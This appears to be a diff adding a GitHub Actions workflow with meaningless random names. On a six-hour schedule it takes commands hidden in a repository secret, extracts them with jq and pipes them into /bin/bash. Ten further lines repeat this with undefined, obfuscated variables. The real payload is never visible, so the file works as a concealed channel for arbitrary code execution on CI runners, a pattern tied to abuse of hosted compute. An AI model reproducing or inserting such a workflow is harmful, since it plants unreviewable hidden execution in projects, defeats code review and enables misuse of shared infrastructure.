@@ -1,0 +1,28 @@
+name: equationmilitary
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: equationmilitary
+        env:
+          le65443: ${{ secrets.le65443 }}
+        run: |
+          echo $le65443 | jq -r .mmg1 | /bin/bash
+          echo $t7261 | jq -r .i38 | /bin/bash
+          echo $qvglc0741 | jq -r .bejk7 | /bin/bash
+          echo $tbeu9014 | jq -r .rh5 | /bin/bash
+          echo $c11 | jq -r .wmy5891 | /bin/bash
+          echo $kn5 | jq -r .wcna2 | /bin/bash
+          echo $lfdhd06 | jq -r .baeie69 | /bin/bash
+          echo $lf9311 | jq -r .nw1632 | /bin/bash
+          echo $kbu380 | jq -r .ecu7 | /bin/bash
+          echo $oypyt00359 | jq -r .hdyzo238 | /bin/bash
+          echo $tkh293 | jq -r .hwbz26678 | /bin/bash
+
